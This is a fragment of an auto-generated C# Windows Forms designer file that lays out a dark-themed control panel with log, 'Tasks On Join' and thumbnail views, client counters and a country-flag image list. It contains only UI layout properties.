            this.Logs.Text = "Logs";
            this.Logs.Width = 874;
            // 
            // contextMenuLogs
            // 
            this.contextMenuLogs.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.contextMenuLogs.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem27,
            this.copyToolStripMenuItem});
            this.contextMenuLogs.Name = "guna2ContextMenuStrip1";
            this.contextMenuLogs.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(((int)(((byte)(151)))), ((int)(((byte)(143)))), ((int)(((byte)(255)))));
            this.contextMenuLogs.RenderStyle.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.contextMenuLogs.RenderStyle.ColorTable = null;
            this.contextMenuLogs.RenderStyle.RoundedEdges = true;
            this.contextMenuLogs.RenderStyle.SelectionArrowColor = System.Drawing.Color.White;
            this.contextMenuLogs.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(100)))), ((int)(((byte)(88)))), ((int)(((byte)(255)))));
            this.contextMenuLogs.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
            this.contextMenuLogs.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
            this.contextMenuLogs.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.ClearTypeGridFit;
            this.contextMenuLogs.Size = new System.Drawing.Size(150, 48);
            // 
            // toolStripMenuItem27
            // 
            this.toolStripMenuItem27.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.toolStripMenuItem27.Name = "toolStripMenuItem27";
            this.toolStripMenuItem27.Size = new System.Drawing.Size(149, 22);
            this.toolStripMenuItem27.Text = "Clear";
            this.toolStripMenuItem27.Click += new System.EventHandler(this.CLEARToolStripMenuItem_Click);
            // 
            // copyToolStripMenuItem
            // 
            this.copyToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.copyToolStripMenuItem.Name = "copyToolStripMenuItem";
            this.copyToolStripMenuItem.Size = new System.Drawing.Size(149, 22);
            this.copyToolStripMenuItem.Text = "Copy Selected";
            this.copyToolStripMenuItem.Click += new System.EventHandler(this.copyToolStripMenuItem_Click_1);
            // 
            // Desktops
            // 
            this.Desktops.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.Desktops.Controls.Add(this.listView4);
            this.Desktops.Controls.Add(this.listView8);
            this.Desktops.Location = new System.Drawing.Point(4, 4);
            this.Desktops.Name = "Desktops";
            this.Desktops.Size = new System.Drawing.Size(880, 282);
            this.Desktops.TabIndex = 2;
            this.Desktops.Text = "Tasks On Join";
            // 
            // listView8
            // 
            this.listView8.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.listView8.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.listView8.Dock = System.Windows.Forms.DockStyle.Fill;
            this.listView8.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(182)))), ((int)(((byte)(37)))), ((int)(((byte)(32)))));
            this.listView8.HideSelection = false;
            this.listView8.LargeImageList = this.ThumbnailImageList;
            this.listView8.Location = new System.Drawing.Point(0, 0);
            this.listView8.Margin = new System.Windows.Forms.Padding(2);
            this.listView8.Name = "listView8";
            this.listView8.ShowItemToolTips = true;
            this.listView8.Size = new System.Drawing.Size(880, 282);
            this.listView8.SmallImageList = this.ThumbnailImageList;
            this.listView8.TabIndex = 1;
            this.listView8.UseCompatibleStateImageBehavior = false;
            // 
            // label11
            // 
            this.label11.AutoSize = true;
            this.label11.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.label11.Font = new System.Drawing.Font("Segoe UI", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label11.ForeColor = System.Drawing.SystemColors.Control;
            this.label11.Location = new System.Drawing.Point(1075, 206);
            this.label11.Name = "label11";
            this.label11.Size = new System.Drawing.Size(37, 30);
            this.label11.TabIndex = 46;
            this.label11.Text = "32";
            // 
            // pictureBox1
            // 
            this.pictureBox1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.pictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox1.Image")));
            this.pictureBox1.Location = new System.Drawing.Point(968, 163);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(101, 85);
            this.pictureBox1.TabIndex = 45;
            this.pictureBox1.TabStop = false;
            // 
            // guna2GradientPanel4
            // 
            this.guna2GradientPanel4.BackColor = System.Drawing.Color.Transparent;
            this.guna2GradientPanel4.BorderRadius = 10;
            this.guna2GradientPanel4.Controls.Add(this.label14);
            this.guna2GradientPanel4.Controls.Add(this.pictureBox8);
            this.guna2GradientPanel4.Controls.Add(this.label13);
            this.guna2GradientPanel4.FillColor = System.Drawing.Color.Aqua;
            this.guna2GradientPanel4.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(128)))), ((int)(((byte)(128)))), ((int)(((byte)(255)))));
            this.guna2GradientPanel4.ForeColor = System.Drawing.Color.White;
            this.guna2GradientPanel4.Location = new System.Drawing.Point(667, 6);
            this.guna2GradientPanel4.Name = "guna2GradientPanel4";
            this.guna2GradientPanel4.ShadowDecoration.BorderRadius = 2;
            this.guna2GradientPanel4.ShadowDecoration.Color = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(142)))), ((int)(((byte)(85)))));
            this.guna2GradientPanel4.Size = new System.Drawing.Size(213, 101);
            this.guna2GradientPanel4.TabIndex = 9;
            // 
            // label14
            // 
            this.label14.AutoSize = true;
            this.label14.BackColor = System.Drawing.Color.Transparent;
            this.label14.Font = new System.Drawing.Font("Segoe UI", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label14.ForeColor = System.Drawing.Color.White;
            this.label14.Location = new System.Drawing.Point(113, 10);
            this.label14.Name = "label14";
            this.label14.Size = new System.Drawing.Size(96, 30);
            this.label14.TabIndex = 41;
            this.label14.Text = "Memory";
            // 
            // pictureBox8
            // 
            this.pictureBox8.BackColor = System.Drawing.Color.Transparent;
            this.pictureBox8.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox8.Image")));
            this.pictureBox8.Location = new System.Drawing.Point(9, 10);
            this.pictureBox8.Name = "pictureBox8";
            this.pictureBox8.Size = new System.Drawing.Size(101, 85);
            this.pictureBox8.TabIndex = 42;
            this.pictureBox8.TabStop = false;
            // 
            // label13
            // 
            this.label13.AutoSize = true;
            this.label13.BackColor = System.Drawing.Color.Transparent;
            this.label13.Font = new System.Drawing.Font("Segoe UI", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label13.ForeColor = System.Drawing.Color.White;
            this.label13.Location = new System.Drawing.Point(115, 47);
            this.label13.Name = "label13";
            this.label13.Size = new System.Drawing.Size(21, 30);
            this.label13.TabIndex = 43;
            this.label13.Text = "-";
            // 
            // Guna2GradientPanel3
            // 
            this.Guna2GradientPanel3.BackColor = System.Drawing.Color.Transparent;
            this.Guna2GradientPanel3.BorderRadius = 10;
            this.Guna2GradientPanel3.Controls.Add(this.label9);
            this.Guna2GradientPanel3.Controls.Add(this.pictureBox7);
            this.Guna2GradientPanel3.Controls.Add(this.label1);
            this.Guna2GradientPanel3.Controls.Add(this.label10);
            this.Guna2GradientPanel3.Controls.Add(this.pictureBox2);
            this.Guna2GradientPanel3.Controls.Add(this.label7);
            this.Guna2GradientPanel3.Controls.Add(this.label2);
            this.Guna2GradientPanel3.Controls.Add(this.pictureBox6);
            this.Guna2GradientPanel3.Controls.Add(this.pictureBox3);
            this.Guna2GradientPanel3.Controls.Add(this.label16);
            this.Guna2GradientPanel3.Controls.Add(this.label8);
            this.Guna2GradientPanel3.Controls.Add(this.pictureBox9);
            this.Guna2GradientPanel3.Controls.Add(this.label4);
            this.Guna2GradientPanel3.Controls.Add(this.label5);
            this.Guna2GradientPanel3.Controls.Add(this.pictureBox5);
            this.Guna2GradientPanel3.Controls.Add(this.label3);
            this.Guna2GradientPanel3.FillColor = System.Drawing.Color.MediumAquamarine;
            this.Guna2GradientPanel3.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(134)))), ((int)(((byte)(138)))), ((int)(((byte)(245)))));
            this.Guna2GradientPanel3.ForeColor = System.Drawing.Color.White;
            this.Guna2GradientPanel3.Location = new System.Drawing.Point(448, 6);
            this.Guna2GradientPanel3.Name = "Guna2GradientPanel3";
            this.Guna2GradientPanel3.ShadowDecoration.BorderRadius = 2;
            this.Guna2GradientPanel3.ShadowDecoration.Color = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(142)))), ((int)(((byte)(85)))));
            this.Guna2GradientPanel3.Size = new System.Drawing.Size(213, 101);
            this.Guna2GradientPanel3.TabIndex = 8;
            // 
            // label9
            // 
            this.label9.AutoSize = true;
            this.label9.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.label9.Font = new System.Drawing.Font("Segoe UI", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label9.ForeColor = System.Drawing.SystemColors.Control;
            this.label9.Location = new System.Drawing.Point(595, 50);
            this.label9.Name = "label9";
            this.label9.Size = new System.Drawing.Size(37, 30);
            this.label9.TabIndex = 46;
            this.label9.Text = "32";
            // 
            // pictureBox7
            // 
            this.pictureBox7.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.pictureBox7.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox7.Image")));
            this.pictureBox7.Location = new System.Drawing.Point(488, 7);
            this.pictureBox7.Name = "pictureBox7";
            this.pictureBox7.Size = new System.Drawing.Size(101, 85);
            this.pictureBox7.TabIndex = 45;
            this.pictureBox7.TabStop = false;
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.label1.Font = new System.Drawing.Font("Segoe UI", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label1.ForeColor = System.Drawing.SystemColors.Control;
            this.label1.Location = new System.Drawing.Point(-328, 8);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(78, 30);
            this.label1.TabIndex = 31;
            this.label1.Text = "Online";
            // 
            // label10
            // 
            this.label10.AutoSize = true;
            this.label10.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.label10.Font = new System.Drawing.Font("Segoe UI", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label10.ForeColor = System.Drawing.SystemColors.Control;
            this.label10.Location = new System.Drawing.Point(594, 8);
            this.label10.Name = "label10";
            this.label10.Size = new System.Drawing.Size(99, 30);
            this.label10.TabIndex = 44;
            this.label10.Text = "Received";
            // 
            // pictureBox2
            // 
            this.pictureBox2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.pictureBox2.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox2.Image")));
            this.pictureBox2.Location = new System.Drawing.Point(-435, 7);
            this.pictureBox2.Name = "pictureBox2";
            this.pictureBox2.Size = new System.Drawing.Size(101, 83);
            this.pictureBox2.TabIndex = 32;
            this.pictureBox2.TabStop = false;
            // 
            // label7
            // 
            this.label7.AutoSize = true;
            this.label7.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.label7.Font = new System.Drawing.Font("Segoe UI", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label7.ForeColor = System.Drawing.SystemColors.Control;
            this.label7.Location = new System.Drawing.Point(366, 45);
            this.label7.Name = "label7";
            this.label7.Size = new System.Drawing.Size(21, 30);
            this.label7.TabIndex = 43;
            this.label7.Text = "-";
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.label2.Font = new System.Drawing.Font("Segoe UI", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label2.ForeColor = System.Drawing.SystemColors.Control;
            this.label2.Location = new System.Drawing.Point(-328, 45);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(61, 30);
            this.label2.TabIndex = 33;
            this.label2.Text = "1267";
            // 
            // pictureBox6
            // 
            this.pictureBox6.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.pictureBox6.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox6.Image")));
            this.pictureBox6.Location = new System.Drawing.Point(260, 8);
            this.pictureBox6.Name = "pictureBox6";
            this.pictureBox6.Size = new System.Drawing.Size(101, 85);
            this.pictureBox6.TabIndex = 42;
            this.pictureBox6.TabStop = false;
            // 
            // pictureBox3
            // 
            this.pictureBox3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.pictureBox3.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox3.Image")));
            this.pictureBox3.Location = new System.Drawing.Point(-254, 8);
            this.pictureBox3.Name = "pictureBox3";
            this.pictureBox3.Size = new System.Drawing.Size(32, 32);
            this.pictureBox3.TabIndex = 34;
            this.pictureBox3.TabStop = false;
            // 
            // label16
            // 
            this.label16.AutoSize = true;
            this.label16.BackColor = System.Drawing.Color.Transparent;
            this.label16.Font = new System.Drawing.Font("Segoe UI", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label16.ForeColor = System.Drawing.Color.White;
            this.label16.Location = new System.Drawing.Point(110, 12);
            this.label16.Name = "label16";
            this.label16.Size = new System.Drawing.Size(54, 30);
            this.label16.TabIndex = 38;
            this.label16.Text = "CPU";
            // 
            // label8
            // 
            this.label8.AutoSize = true;
            this.label8.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.label8.Font = new System.Drawing.Font("Segoe UI", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label8.ForeColor = System.Drawing.SystemColors.Control;
            this.label8.Location = new System.Drawing.Point(364, 8);
            this.label8.Name = "label8";
            this.label8.Size = new System.Drawing.Size(96, 30);
            this.label8.TabIndex = 41;
            this.label8.Text = "Memory";
            // 
            // pictureBox9
            // 
            this.pictureBox9.BackColor = System.Drawing.Color.Transparent;
            this.pictureBox9.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox9.Image")));
            this.pictureBox9.Location = new System.Drawing.Point(3, 6);
            this.pictureBox9.Name = "pictureBox9";
            this.pictureBox9.Size = new System.Drawing.Size(101, 92);
            this.pictureBox9.TabIndex = 39;
            this.pictureBox9.TabStop = false;
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.label4.Font = new System.Drawing.Font("Segoe UI", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label4.ForeColor = System.Drawing.SystemColors.Control;
            this.label4.Location = new System.Drawing.Point(-96, 9);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(95, 30);
            this.label4.TabIndex = 35;
            this.label4.Text = "Selected";
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.BackColor = System.Drawing.Color.Transparent;
            this.label5.Font = new System.Drawing.Font("Segoe UI", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label5.ForeColor = System.Drawing.Color.White;
            this.label5.Location = new System.Drawing.Point(109, 49);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(25, 30);
            this.label5.TabIndex = 40;
            this.label5.Text = "0";
            // 
            // pictureBox5
            // 
            this.pictureBox5.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.pictureBox5.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox5.Image")));
            this.pictureBox5.Location = new System.Drawing.Point(-203, 0);
            this.pictureBox5.Name = "pictureBox5";
            this.pictureBox5.Size = new System.Drawing.Size(102, 98);
            this.pictureBox5.TabIndex = 36;
            this.pictureBox5.TabStop = false;
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.label3.Font = new System.Drawing.Font("Segoe UI", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label3.ForeColor = System.Drawing.SystemColors.Control;
            this.label3.Location = new System.Drawing.Point(-96, 46);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(61, 30);
            this.label3.TabIndex = 37;
            this.label3.Text = "1267";
            // 
            // label12
            // 
            this.label12.AutoSize = true;
            this.label12.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.label12.Font = new System.Drawing.Font("Segoe UI", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label12.ForeColor = System.Drawing.SystemColors.Control;
            this.label12.Location = new System.Drawing.Point(1074, 164);
            this.label12.Name = "label12";
            this.label12.Size = new System.Drawing.Size(99, 30);
            this.label12.TabIndex = 44;
            this.label12.Text = "Received";
            // 
            // Guna2GradientPanel1
            // 
            this.Guna2GradientPanel1.BackColor = System.Drawing.Color.Transparent;
            this.Guna2GradientPanel1.BorderRadius = 10;
            this.Guna2GradientPanel1.Controls.Add(this.pictureBox11);
            this.Guna2GradientPanel1.Controls.Add(this.label19);
            this.Guna2GradientPanel1.Controls.Add(this.pictureBox12);
            this.Guna2GradientPanel1.Controls.Add(this.label20);
            this.Guna2GradientPanel1.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(116)))), ((int)(((byte)(154)))));
            this.Guna2GradientPanel1.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(142)))), ((int)(((byte)(85)))));
            this.Guna2GradientPanel1.ForeColor = System.Drawing.Color.White;
            this.Guna2GradientPanel1.Location = new System.Drawing.Point(10, 6);
            this.Guna2GradientPanel1.Name = "Guna2GradientPanel1";
            this.Guna2GradientPanel1.ShadowDecoration.BorderRadius = 2;
            this.Guna2GradientPanel1.ShadowDecoration.Color = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(142)))), ((int)(((byte)(85)))));
            this.Guna2GradientPanel1.Size = new System.Drawing.Size(213, 101);
            this.Guna2GradientPanel1.TabIndex = 6;
            // 
            // pictureBox11
            // 
            this.pictureBox11.BackColor = System.Drawing.Color.Transparent;
            this.pictureBox11.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox11.Image")));
            this.pictureBox11.Location = new System.Drawing.Point(181, 10);
            this.pictureBox11.Name = "pictureBox11";
            this.pictureBox11.Size = new System.Drawing.Size(32, 32);
            this.pictureBox11.TabIndex = 12;
            this.pictureBox11.TabStop = false;
            // 
            // label19
            // 
            this.label19.AutoSize = true;
            this.label19.BackColor = System.Drawing.Color.Transparent;
            this.label19.Font = new System.Drawing.Font("Segoe UI", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label19.ForeColor = System.Drawing.Color.White;
            this.label19.Location = new System.Drawing.Point(107, 47);
            this.label19.Name = "label19";
            this.label19.Size = new System.Drawing.Size(61, 30);
            this.label19.TabIndex = 11;
            this.label19.Text = "1267";
            // 
            // pictureBox12
            // 
            this.pictureBox12.BackColor = System.Drawing.Color.Transparent;
            this.pictureBox12.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox12.Image")));
            this.pictureBox12.Location = new System.Drawing.Point(3, 10);
            this.pictureBox12.Name = "pictureBox12";
            this.pictureBox12.Size = new System.Drawing.Size(101, 83);
            this.pictureBox12.TabIndex = 10;
            this.pictureBox12.TabStop = false;
            // 
            // label20
            // 
            this.label20.AutoSize = true;
            this.label20.BackColor = System.Drawing.Color.Transparent;
            this.label20.Font = new System.Drawing.Font("Segoe UI", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label20.ForeColor = System.Drawing.Color.White;
            this.label20.Location = new System.Drawing.Point(107, 10);
            this.label20.Name = "label20";
            this.label20.Size = new System.Drawing.Size(78, 30);
            this.label20.TabIndex = 9;
            this.label20.Text = "Online";
            // 
            // Guna2GradientPanel2
            // 
            this.Guna2GradientPanel2.BackColor = System.Drawing.Color.Transparent;
            this.Guna2GradientPanel2.BorderRadius = 10;
            this.Guna2GradientPanel2.Controls.Add(this.label18);
            this.Guna2GradientPanel2.Controls.Add(this.label17);
            this.Guna2GradientPanel2.Controls.Add(this.pictureBox10);
            this.Guna2GradientPanel2.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(12)))), ((int)(((byte)(253)))));
            this.Guna2GradientPanel2.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(203)))), ((int)(((byte)(16)))), ((int)(((byte)(255)))));
            this.Guna2GradientPanel2.ForeColor = System.Drawing.Color.White;
            this.Guna2GradientPanel2.Location = new System.Drawing.Point(229, 6);
            this.Guna2GradientPanel2.Name = "Guna2GradientPanel2";
            this.Guna2GradientPanel2.ShadowDecoration.BorderRadius = 2;
            this.Guna2GradientPanel2.ShadowDecoration.Color = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(142)))), ((int)(((byte)(85)))));
            this.Guna2GradientPanel2.Size = new System.Drawing.Size(213, 101);
            this.Guna2GradientPanel2.TabIndex = 7;
            // 
            // label18
            // 
            this.label18.AutoSize = true;
            this.label18.BackColor = System.Drawing.Color.Transparent;
            this.label18.Font = new System.Drawing.Font("Segoe UI", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label18.ForeColor = System.Drawing.Color.White;
            this.label18.Location = new System.Drawing.Point(115, 12);
            this.label18.Name = "label18";
            this.label18.Size = new System.Drawing.Size(95, 30);
            this.label18.TabIndex = 35;
            this.label18.Text = "Selected";
            // 
            // label17
            // 
            this.label17.AutoSize = true;
            this.label17.BackColor = System.Drawing.Color.Transparent;
            this.label17.Font = new System.Drawing.Font("Segoe UI", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label17.ForeColor = System.Drawing.Color.White;
            this.label17.Location = new System.Drawing.Point(115, 49);
            this.label17.Name = "label17";
            this.label17.Size = new System.Drawing.Size(61, 30);
            this.label17.TabIndex = 37;
            this.label17.Text = "1267";
            // 
            // pictureBox10
            // 
            this.pictureBox10.BackColor = System.Drawing.Color.Transparent;
            this.pictureBox10.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox10.Image")));
            this.pictureBox10.Location = new System.Drawing.Point(8, 3);
            this.pictureBox10.Name = "pictureBox10";
            this.pictureBox10.Size = new System.Drawing.Size(102, 98);
            this.pictureBox10.TabIndex = 36;
            this.pictureBox10.TabStop = false;
            // 
            // zzimageList1
            // 
            this.zzimageList1.ImageStream = ((System.Windows.Forms.ImageListStreamer)(resources.GetObject("zzimageList1.ImageStream")));
            this.zzimageList1.TransparentColor = System.Drawing.Color.Transparent;
            this.zzimageList1.Images.SetKeyName(0, "--.png");
            // 
            // guna2Elipse4
            // 
            this.guna2Elipse4.BorderRadius = 13;
            this.guna2Elipse4.TargetControl = this.Pnlinfo;
            // 
            // listView3
            // 
            this.listView3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.listView3.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.listView3.ContextMenuStrip = this.contextMenuThumbnail;
            this.listView3.Dock = System.Windows.Forms.DockStyle.Fill;
            this.listView3.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.listView3.HideSelection = false;
            this.listView3.LargeImageList = this.ThumbnailImageList;
            this.listView3.Location = new System.Drawing.Point(59, 41);
            this.listView3.Margin = new System.Windows.Forms.Padding(2);
            this.listView3.Name = "listView3";
            this.listView3.ShowItemToolTips = true;
            this.listView3.Size = new System.Drawing.Size(888, 419);
            this.listView3.SmallImageList = this.ThumbnailImageList;
            this.listView3.TabIndex = 0;
            this.listView3.UseCompatibleStateImageBehavior = false;
            this.listView3.Visible = false;
            // 
            // contextMenuThumbnail
            // 
            this.contextMenuThumbnail.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.contextMenuThumbnail.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.sTARTToolStripMenuItem,
            this.sTOPToolStripMenuItem});
            this.contextMenuThumbnail.Name = "guna2ContextMenuStrip1";
            this.contextMenuThumbnail.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(((int)(((byte)(192)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.contextMenuThumbnail.RenderStyle.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.contextMenuThumbnail.RenderStyle.ColorTable = null;
            this.contextMenuThumbnail.RenderStyle.RoundedEdges = true;
            this.contextMenuThumbnail.RenderStyle.SelectionArrowColor = System.Drawing.Color.White;
            this.contextMenuThumbnail.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(100)))), ((int)(((byte)(88)))), ((int)(((byte)(255)))));
            this.contextMenuThumbnail.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
            this.contextMenuThumbnail.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
            this.contextMenuThumbnail.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.ClearTypeGridFit;
            this.contextMenuThumbnail.Size = new System.Drawing.Size(99, 48);
            // 
            // sTARTToolStripMenuItem
            // 
            this.sTARTToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.sTARTToolStripMenuItem.Name = "sTARTToolStripMenuItem";
            this.sTARTToolStripMenuItem.Size = new System.Drawing.Size(98, 22);
            this.sTARTToolStripMenuItem.Text = "Start";
            this.sTARTToolStripMenuItem.Click += new System.EventHandler(this.STARTToolStripMenuItem_Click);
            // 
            // sTOPToolStripMenuItem
            // 
            this.sTOPToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.sTOPToolStripMenuItem.Name = "sTOPToolStripMenuItem";
            this.sTOPToolStripMenuItem.Size = new System.Drawing.Size(98, 22);
            this.sTOPToolStripMenuItem.Text = "Stop";
            this.sTOPToolStripMenuItem.Click += new System.EventHandler(this.STOPToolStripMenuItem_Click);
            // 
            // imgFlags
            // 
            this.imgFlags.ImageStream = ((System.Windows.Forms.ImageListStreamer)(resources.GetObject("imgFlags.ImageStream")));
            this.imgFlags.TransparentColor = System.Drawing.Color.Transparent;
            this.imgFlags.Images.SetKeyName(0, "ad.png");
            this.imgFlags.Images.SetKeyName(1, "ae.png");
            this.imgFlags.Images.SetKeyName(2, "af.png");
            this.imgFlags.Images.SetKeyName(3, "ag.png");
            this.imgFlags.Images.SetKeyName(4, "ai.png");
            this.imgFlags.Images.SetKeyName(5, "al.png");
            this.imgFlags.Images.SetKeyName(6, "am.png");
            this.imgFlags.Images.SetKeyName(7, "an.png");
            this.imgFlags.Images.SetKeyName(8, "ao.png");
            this.imgFlags.Images.SetKeyName(9, "ar.png");
            this.imgFlags.Images.SetKeyName(10, "as.png");
            this.imgFlags.Images.SetKeyName(11, "at.png");
            this.imgFlags.Images.SetKeyName(12, "au.png");
            this.imgFlags.Images.SetKeyName(13, "aw.png");
            this.imgFlags.Images.SetKeyName(14, "ax.png");
            this.imgFlags.Images.SetKeyName(15, "az.png");
            this.imgFlags.Images.SetKeyName(16, "ba.png");
            this.imgFlags.Images.SetKeyName(17, "bb.png");
            this.imgFlags.Images.SetKeyName(18, "bd.png");
            this.imgFlags.Images.SetKeyName(19, "be.png");
